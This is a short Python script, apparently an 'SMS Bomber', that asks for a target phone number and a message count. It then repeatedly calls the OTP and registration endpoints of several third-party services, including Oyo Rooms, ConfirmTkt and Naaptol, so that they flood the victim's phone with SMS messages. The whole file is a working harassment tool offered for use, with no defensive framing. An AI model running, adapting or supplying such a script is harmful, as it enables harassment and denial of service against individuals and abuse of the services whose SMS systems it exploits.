from urllib.request import Request,urlopen
from urllib.parse import urlencode,quote_plus
import platform
import os
import time
import urllib
import urllib.request
import http.cookiejar

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                    
                                   By : Mas Lian  
                               https://github/haimaslian                                                                                                
""")
#http://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#http://www.quikr.com/SignIn?aj=1&for=send_otp&user=

#https://api.oyorooms.com/v2/users/generate_otp?phone=$no&nod=4&intent=login&sms_auto_retrieval=true&country_code=%2B62&version=20176&partner_app_version=20176&android_id=6bb443543d62ab32&idfa=f4883355-288c-4528-b38f-d52ac56746f4&sid=154377531495

def send(num, counter, slep):
    url1 = ["https://api.oyorooms.com/v2/users/generate_otp?phone=$no&nod=4&intent=login&sms_auto_retrieval=true&country_code=%2B62&version=20176&partner_app_version=20176&android_id=6bb443543d62ab32&idfa=f4883355-288c-4528-b38f-d52ac56746f4&sid=154377531495","https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="]
    #url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
    data={"phone":num}
    x=y=0
    for y in range(int(counter)):
        for x in url1:
            banner()
            print("Target Number          : ", num)
            print("Number of Message Sent : ", y+1)
            result_url=str(x)+num
            resp1=Request(result_url)
            urlopen(resp1)
            time.sleep(slep)        

banner()
send(input("Enter Target Number : "), input("Enter Number of Messages : "), 1)